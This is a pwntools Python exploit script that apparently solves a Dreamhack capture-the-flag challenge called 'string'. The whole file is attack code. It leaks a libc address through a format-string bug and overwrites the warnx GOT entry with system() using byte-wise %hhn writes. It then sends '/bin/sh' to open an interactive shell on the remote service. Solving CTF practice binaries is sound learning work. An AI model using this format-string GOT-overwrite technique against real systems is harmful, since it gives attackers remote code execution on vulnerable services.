#!/usr/bin/env python3

from pwn import *

exe = ELF("./string")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14119)

    return r


def width(printed, target):
    ret = (target - printed) & 0xFF
    if ret == 0:
        ret = 256
    return str(ret).encode()     

def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", b"%71$p")

    r.sendlineafter(b"> ", b"2")
    r.recvuntil(b": ")
    leak = int(r.recvline()[:-1], 16)
    __libc_start_main = leak - 247

    libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
    system = libc.symbols["system"]
    warnx_got = exe.got["warnx"]

    payload = b"%" + width(0, system & 0xFF) + b"c"
    payload += b"%17$hhn"
    payload += b"%" + width(system & 0xFF, (system >> 8) & 0xFF) + b"c"
    payload += b"%18$hhn"
    payload += b"%" + width((system >> 8) & 0xFF, (system >> 16) & 0xFF) + b"c"
    payload += b"%19$hhn"
    payload += b"%" + width((system >> 16) & 0xFF, (system >> 24) & 0xFF) + b"c"
    payload += b"%20$hhn"
    payload = payload.ljust(48, b"A")
    payload += p32(warnx_got)
    payload += p32(warnx_got + 1)
    payload += p32(warnx_got + 2)
    payload += p32(warnx_got + 3)

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", payload)
    r.sendlineafter(b"> ", b"2")

    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Input: ", b"/bin/sh\x00")
    r.sendlineafter(b"> ", b"2")

    r.interactive()


if __name__ == "__main__":
    main()
